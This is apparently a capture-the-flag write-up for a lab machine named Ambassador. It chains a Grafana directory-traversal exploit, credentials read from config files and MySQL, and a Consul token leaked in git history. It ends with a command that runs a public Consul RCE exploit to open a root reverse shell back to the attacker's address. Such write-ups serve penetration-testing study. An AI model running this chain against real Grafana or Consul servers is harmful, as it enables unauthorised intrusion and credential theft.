# Ambassador

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.228.56
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 05:49 EDT
Nmap scan report for 10.129.228.56
Host is up (0.015s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
3306/tcp open  mysql
```

### Port 80

The only interesting thing here is the mentioning of the user `developer`:

<figure><img src="../../../.gitbook/assets/image (1434).png" alt=""><figcaption></figcaption></figure>

Other than that, there was not much here.

### Grafana LFI --> Creds

Port 3000 was hosting a Grafana instance.

<figure><img src="../../../.gitbook/assets/image (1458).png" alt=""><figcaption></figcaption></figure>

This version of Grafana is vulnerable to public exploits:

```
$ searchsploit grafana                
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Grafana 7.0.1 - Denial of Service (PoC)                    | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbitrary File Rea | multiple/webapps/50581.py
----------------------------------------------------------- ---------------------------------
```

We can confirm that this works:

<figure><img src="../../../.gitbook/assets/image (2790).png" alt=""><figcaption></figcaption></figure>

Grafana stores a configuration file at `/etc/grafana/grafana.ini`, so let's start there. We can find some passwords within that:

```
# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = messageInABottle685427
```

With this, we can login to the admin panel:

<figure><img src="../../../.gitbook/assets/image (3342).png" alt=""><figcaption></figcaption></figure>

Within the configuration files, we can find a `mysql.yaml` file.

<figure><img src="../../../.gitbook/assets/image (878).png" alt=""><figcaption></figcaption></figure>

We can't edit it, and there wasn't any credentials in it:

<figure><img src="../../../.gitbook/assets/image (2887).png" alt=""><figcaption></figcaption></figure>

However, maybe we can use the LFI to read this file on the machine itself.&#x20;

{% embed url="https://grafana.com/docs/grafana/latest/administration/provisioning/" %}

Based on this documentation, it is located in`/etc/grafana/provisioning/datasources`.&#x20;

<figure><img src="../../../.gitbook/assets/image (2008).png" alt=""><figcaption></figcaption></figure>

Using these creds, we can login to the MySQL database on the machine:

```
$ mysql -u grafana -h 10.129.228.56 -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 11
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

Then, we can use the `whackywidget` database to find the password for `developer`.&#x20;

```
MySQL [whackywidget]> select * from users\g
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+

$ echo YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | base64 -d
anEnglishManInNewYork027468
```

We can then login as `developer` via `ssh` using this password.

## Privilege Escalation

### Consul Token --> RCE

I was wondering where that `whackywidget` dataabse came from and why it had the password for the user instead of the `grafana` database. Within the `/opt` directory, we can find some additional folders:

```
developer@ambassador:/opt$ ll
total 16
drwxr-xr-x  4 root   root   4096 Sep  1  2022 ./
drwxr-xr-x 20 root   root   4096 Sep 15  2022 ../
drwxr-xr-x  4 consul consul 4096 Mar 13  2022 consul/
drwxrwxr-x  5 root   root   4096 Mar 13  2022 my-app/

developer@ambassador:/opt/my-app$ ls
env  whackywidget
```

`consul` is an application used to configure and spin up applications with databases:

{% embed url="https://github.com/hashicorp/consul" %}

The application on the machine starts on port 8500, and we can also find out the version running:

```
developer@ambassador:/opt/my-app/env$ netstat -tulon
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      off (0.00/0/0)

developer@ambassador:/opt/my-app/env$ consul --version
Consul v1.13.2
```

There are some exploits for this:

{% embed url="https://github.com/owalid/consul-rce" %}

However, we first need to find the token within the files. Within the `/opt/my-app` directory, there's a `.git` repository.

```
developer@ambassador:/opt/my-app$ ls -la
total 24
drwxrwxr-x 5 root root 4096 Mar 13  2022 .
drwxr-xr-x 4 root root 4096 Sep  1  2022 ..
drwxrwxr-x 4 root root 4096 Mar 13  2022 env
drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
```

If we check the logs, we can find the token:

```
developer@ambassador:/opt/my-app$ git log -p -2
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

Afterwards, just run the PoC above on the machine itself.&#x20;

```bash
developer@ambassador:~$ python3 exploit_consul.py --rhost 127.0.0.1 --rport 8500 --lhost 10.10.14.13 --lport 443 --token bb03b43b-1d81-d62b-24b5-39540ee469b5
```

This would give us a reverse shell as `root`.

<figure><img src="../../../.gitbook/assets/image (3192).png" alt=""><figcaption></figcaption></figure>
